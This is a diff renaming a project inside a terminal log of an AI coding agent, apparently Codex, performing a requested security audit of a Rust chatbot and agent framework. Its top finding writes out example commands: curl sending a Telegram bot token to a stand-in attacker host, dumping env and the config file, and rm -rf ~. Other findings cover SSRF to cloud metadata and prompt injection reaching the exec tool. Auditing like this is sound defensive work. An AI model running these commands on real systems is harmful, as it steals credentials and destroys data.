@@ -1,5 +1,5 @@
 codex --full-auto
-root@claude-code:/opt/nanobot-rust/nanobot-rust# codex --full-auto
+root@claude-code:/opt/kestrel/kestrel# codex --full-auto
 ⚠ Codex could not find bubblewrap on PATH. Install bubblewrap with your OS pack
   age manager. See the sandbox prerequisites:
   https://developers.openai.com/codex/concepts/sandboxing#prerequisites. Codex
@@ -9,13 +9,13 @@ root@claude-code:/opt/nanobot-rust/nanobot-rust# codex --full-auto
 │ >_ OpenAI Codex (v0.120.0)                │
 │                                           │
 │ model:     gpt-5.4   /model to change     │
-│ directory: /opt/nanobot-rust/nanobot-rust │
+│ directory: /opt/kestrel/kestrel │
 ╰───────────────────────────────────────────╯
 
   Tip: New Use /fast to enable our fastest inference at 2X plan usage.
 
 
-› You are the Black Hat analyst for nanobot-rust. Read CLAUDE.md first, then
+› You are the Black Hat analyst for kestrel. Read CLAUDE.md first, then
   actively TRY to break the codebase conceptually.
 
   Find:
@@ -36,16 +36,16 @@ root@claude-code:/opt/nanobot-rust/nanobot-rust# codex --full-auto
   For EACH: exact scenario, file:line, severity P0-P3, production impact. Be
   specific and devastating.
 
-  gpt-5.4 default · /opt/nanobot-rust/nanobot-rust
+  gpt-5.4 default · /opt/kestrel/kestrel
 
 
 › Summarize recent commits
 
-  gpt-5.4 default · /opt/nanobot-rust/nanobot-rust
+  gpt-5.4 default · /opt/kestrel/kestrel
 
 
 
-› You are the Black Hat analyst for nanobot-rust. Read CLAUDE.md first, then
+› You are the Black Hat analyst for kestrel. Read CLAUDE.md first, then
   actively TRY to break the codebase conceptually.
 
   Find:
@@ -75,7 +75,7 @@ root@claude-code:/opt/nanobot-rust/nanobot-rust# codex --full-auto
   └ List rg --files -g CLAUDE.md -g Cargo.toml -g '*.rs'
 
 • Ran pwd
-  └ /opt/nanobot-rust/nanobot-rust
+  └ /opt/kestrel/kestrel
 
 ────────────────────────────────────────────────────────────────────────────────
 
@@ -136,7 +136,7 @@ oneshot|
     Search std::fs::|read_to_string\(|write\(|OpenOptions::new\(|read_dir\( in
            loop_mod.rs
     Read loop_mod.rs, openai_compat.rs, anthropic.rs, gateway.rs, runner.rs
-    Search BUS_CHANNEL_CAPACITY|pub const BUS_CHANNEL_CAPACITY in nanobot-core
+    Search BUS_CHANNEL_CAPACITY|pub const BUS_CHANNEL_CAPACITY in kestrel-core
     Read queue.rs, manager.rs
     Search run_outbound_consumer|send_message\(|send_typing\(|retryable in
            manager.rs
@@ -145,7 +145,7 @@ oneshot|
            session_keys\.lock\(|session_keys\. in telegram.rs
     Read gateway.rs
     Search compact_session|build_summary\(|CompactionConfig|compaction in
-nanobot-
+kestrel-
            agent
     Read loop_mod.rs, notes.rs, manager.rs, cron.rs, event.rs
 
@@ -154,7 +154,7 @@ nanobot-
 
 › Summarize recent commits
 
-  gpt-5.4 default · /opt/nanobot-rust/nanobot-rust
+  gpt-5.4 default · /opt/kestrel/kestrel
 
 
 • Explored
@@ -178,12 +178,12 @@ clear\( in
 \.last\(\)\.unwrap\( in
            crates
     Read compaction.rs, commands.rs, loop_mod.rs, skill_loader.rs
-    Search save_session\(|append_entry\(|flush_all\(|reset_session\( in nanobot-
+    Search save_session\(|append_entry\(|flush_all\(|reset_session\( in kestrel-
            agent
     Search std::fs::|read_to_string\(|write\(|OpenOptions::new\(|read_dir\( in
            loop_mod.rs
     Read loop_mod.rs, openai_compat.rs, anthropic.rs, gateway.rs, runner.rs
-    Search BUS_CHANNEL_CAPACITY|pub const BUS_CHANNEL_CAPACITY in nanobot-core
+    Search BUS_CHANNEL_CAPACITY|pub const BUS_CHANNEL_CAPACITY in kestrel-core
     Read queue.rs, manager.rs
     Search run_outbound_consumer|send_message\(|send_typing\(|retryable in
            manager.rs
@@ -192,7 +192,7 @@ clear\( in
            session_keys\.lock\(|session_keys\. in telegram.rs
     Read gateway.rs
     Search compact_session|build_summary\(|CompactionConfig|compaction
-in nanobot-
+in kestrel-
            agent
     Read loop_mod.rs, notes.rs, manager.rs, cron.rs, event.rs
 
@@ -210,18 +210,18 @@ in nanobot-
 
 • Findings
 
-  - P0 SECURITY crates/nanobot-tools/src/builtins/shell.rs:89-153, src/commands/
+  - P0 SECURITY crates/kestrel-tools/src/builtins/shell.rs:89-153, src/commands/
     gateway.rs:93-101
     Exact scenario: any prompt that reaches the exec tool can run arbitrary sh -
     c with inherited process environment. The blacklist only blocks a few subst
-    rings. curl https://attacker/x?tg=$TELEGRAM_BOT_TOKEN, env, cat ~/.nanobot-
+    rings. curl https://attacker/x?tg=$TELEGRAM_BOT_TOKEN, env, cat ~/.kestrel-
     rs/config.yaml, python -c ..., rm -rf ~ all still work. Gateway also copies
     Telegram/Discord tokens into env before tools are registered.
     Production impact: full RCE plus trivial bot-token exfiltration from the
     running process. This is total host compromise if the model is prompt-
     injectable or any untrusted user can influence tool use.
-  - P0 SECURITY crates/nanobot-tools/src/builtins/web.rs:216-233, crates/
-    nanobot-security/src/network.rs:79-96
+  - P0 SECURITY crates/kestrel-tools/src/builtins/web.rs:216-233, crates/
+    kestrel-security/src/network.rs:79-96
     Exact scenario: web_fetch accepts an arbitrary URL and performs a raw reqwe
     st GET without calling SsrfGuard::validate_url. http://127.0.0.1:...,
     http://169.254.169.254/latest/meta-data/..., cluster-internal services, Doc
@@ -229,8 +229,8 @@ in nanobot-
     Production impact: SSRF into loopback, cloud metadata, and internal control
     planes. If this runs in cloud/container environments, credential theft is
     immediate.
-  - P1 DATA LOSS crates/nanobot-agent/src/loop_mod.rs:310-343, crates/nanobot-
-    session/src/store.rs:90-113, crates/nanobot-session/src/note_store.rs:58-83
+  - P1 DATA LOSS crates/kestrel-agent/src/loop_mod.rs:310-343, crates/kestrel-
+    session/src/store.rs:90-113, crates/kestrel-session/src/note_store.rs:58-83
     Exact scenario: the model successfully generates a reply, then
     save_session() runs before publish_outbound(). If disk is full, the
     filesystem is read-only, or the rename/write fails, the function returns
@@ -238,7 +238,7 @@ in nanobot-
     Production impact: users lose successful responses after tokens were already
     spent. This is silent from the user’s perspective and will look like random
     bot hangs under storage pressure.
-  - P1 RESOURCE LEAK crates/nanobot-channels/src/platforms/
+  - P1 RESOURCE LEAK crates/kestrel-channels/src/platforms/
     websocket.rs:108, :179-180, :339-347
     Exact scenario: every WebSocket client gets an
     mpsc::UnboundedSender<String>. A slow or stuck browser tab that stops
@@ -246,40 +246,40 @@ in nanobot-
     bound.
     Production impact: one slow client can consume unbounded RAM and kill the
     process. This is a clean remote memory-DoS on the WebSocket channel.
-  - P1 RESOURCE LEAK / INCORRECT ASYNC crates/nanobot-tools/src/builtins/
+  - P1 RESOURCE LEAK / INCORRECT ASYNC crates/kestrel-tools/src/builtins/
     web.rs:228-245
     Exact scenario: web_fetch reads the entire response body with .text().await
     and only truncates after buffering. Point it at a multi-GB response,
     infinite chunked stream, or a server that lies about size.
     Production impact: memory blow-up, allocator churn, and process OOM. There
     is no streaming cap, no content-length guard, and no early abort.
-  - P1 CRASH VECTOR crates/nanobot-agent/src/compaction.rs:257-259, :295-297,
-    reachable from crates/nanobot-agent/src/loop_mod.rs:178-179
+  - P1 CRASH VECTOR crates/kestrel-agent/src/compaction.rs:257-259, :295-297,
+    reachable from crates/kestrel-agent/src/loop_mod.rs:178-179
     Exact scenario: once context compaction triggers, a message whose first
     77/197 bytes cut through a multibyte UTF-8 character will panic on
     &str[..N]. A long CJK/emoji-heavy message is enough.
     Production impact: hard process crash during normal conversation growth.
     This is user-triggerable with content alone.
-  - P1 CRASH VECTOR crates/nanobot-tools/src/builtins/web.rs:248-249
+  - P1 CRASH VECTOR crates/kestrel-tools/src/builtins/web.rs:248-249
     Exact scenario: a fetched page over 50,000 bytes whose byte 50,000 is not a
     char boundary panics on &text[..50_000]. Non-ASCII pages make this
     realistic.
     Production impact: remote crash via a malicious or just non-English webpage.
-  - P1 DATA LOSS / GRACEFUL DEGRADATION FAILURE crates/nanobot-cron/src/
-    state_store.rs:46-49, crates/nanobot-agent/src/notes.rs:231-255
+  - P1 DATA LOSS / GRACEFUL DEGRADATION FAILURE crates/kestrel-cron/src/
+    state_store.rs:46-49, crates/kestrel-agent/src/notes.rs:231-255
     Exact scenario: if the cron state JSON or notes JSON is truncated/corrupted
     by power loss or partial write, startup/load silently falls back to empty
     state: unwrap_or_default() for cron, "Starting fresh" for notes.
     Production impact: irreversible schedule state loss and note loss with no
     quarantine, no backup, and no hard failure. Operators will think the system
     recovered while it actually forgot state.
-  - P1 DATA LOSS crates/nanobot-channels/src/manager.rs:77-102
+  - P1 DATA LOSS crates/kestrel-channels/src/manager.rs:77-102
     Exact scenario: if send_message() fails because the channel is disconnected,
     rate-limited, or transiently broken, the manager just logs and drops the
     outbound. No retry, no dead-letter queue, no persistence.
     Production impact: outbound replies vanish under routine network faults.
     This will absolutely eat user messages in production.
-  - P2 DEADLOCK / STARVATION RISK crates/nanobot-channels/src/platforms/
+  - P2 DEADLOCK / STARVATION RISK crates/kestrel-channels/src/platforms/
     telegram.rs:971-983
     Exact scenario: the callback router mutex is held across
     router_guard.dispatch(ctx).await. Any handler that tries to re-enter router
@@ -287,24 +287,24 @@ in nanobot-
     in-flight network/LLM action indefinitely.
     Production impact: Telegram inline-button flows can wedge under load or with
     a bad handler, presenting as “buttons spin forever”.
-  - P2 RESOURCE LEAK crates/nanobot-session/src/manager.rs:21, :63-92; crates/
-    nanobot-agent/src/subagent.rs:307, :358-370, :628-632
+  - P2 RESOURCE LEAK crates/kestrel-session/src/manager.rs:21, :63-92; crates/
+    kestrel-agent/src/subagent.rs:307, :358-370, :628-632
     Exact scenario: session cache is a DashMap with no eviction, and sub-agent
     tracked tasks accumulate until cleanup_completed() is called, but production
     code never calls it. Attack with many distinct chat IDs or repeated subagent
     spawns.
     Production impact: long-lived processes grow memory monotonically until
     restart or OOM.
-  - P2 INCORRECT ASYNC / COST LEAK crates/nanobot-providers/src/
-    openai_compat.rs:152-196, crates/nanobot-providers/src/anthropic.rs:182-226
+  - P2 INCORRECT ASYNC / COST LEAK crates/kestrel-providers/src/
+    openai_compat.rs:152-196, crates/kestrel-providers/src/anthropic.rs:182-226
     Exact scenario: SSE parsing runs in detached tokio::spawn tasks. If the
     downstream receiver is dropped because the user disconnects/cancels, send
     errors are ignored and the task keeps draining the upstream provider stream
     until completion.
     Production impact: wasted tokens, wasted bandwidth, and orphaned background
     work after client disconnects.
-  - P2 DATA LOSS / BUS LAG crates/nanobot-bus/src/queue.rs:46-47, src/commands/
-    gateway.rs:214-230, :264-280, crates/nanobot-agent/src/runner.rs:63-
+  - P2 DATA LOSS / BUS LAG crates/kestrel-bus/src/queue.rs:46-47, src/commands/
+    gateway.rs:214-230, :264-280, crates/kestrel-agent/src/runner.rs:63-
     70, :219-223
     Exact scenario: lifecycle and stream traffic use broadcast with capacity
     256. On bursty streaming/tool traffic, receivers lag, events are dropped,
@@ -313,7 +313,7 @@ in nanobot-
     Production impact: stuck typing indicators, missing learning events,
     ambiguous/misrouted stream chunks, and nondeterministic observability gaps
     exactly when the system is busiest.
-  - P2 SECURITY crates/nanobot-config/src/loader.rs:57-61, crates/nanobot-
+  - P2 SECURITY crates/kestrel-config/src/loader.rs:57-61, crates/kestrel-
     config/src/paths.rs:97-100
     Exact scenario: config files and state directories are created with default
     OS permissions only; there is no explicit 0600/0700. On a permissive umask,
@@ -323,12 +323,12 @@ in nanobot-
 
   Reachable Production Panic Sites
 
-  - Reachable and input-triggerable: crates/nanobot-agent/src/compaction.rs:257-
-    259, :295-297; crates/nanobot-tools/src/builtins/web.rs:248-249; src/
+  - Reachable and input-triggerable: crates/kestrel-agent/src/compaction.rs:257-
+    259, :295-297; crates/kestrel-tools/src/builtins/web.rs:248-249; src/
     commands/cron.rs:42-45 if a non-ASCII job.id is loaded from disk and sliced
     at 36 bytes.
-  - Low-value/static invariants only: src/main.rs:207, crates/nanobot-tools/src/
-    builtins/cron.rs:80, crates/nanobot-tools/src/builtins/web.rs:260,263,
+  - Low-value/static invariants only: src/main.rs:207, crates/kestrel-tools/src/
+    builtins/cron.rs:80, crates/kestrel-tools/src/builtins/web.rs:260,263,
     regex/midnight expects. I would not treat those as attacker-grade unless the
     code path invariants are already broken by another bug.
 
@@ -340,4 +340,4 @@ in nanobot-
 › codex --full-auto
 
 
-  gpt-5.4 default · /opt/nanobot-rust/nanobot-rust
+  gpt-5.4 default · /opt/kestrel/kestrel
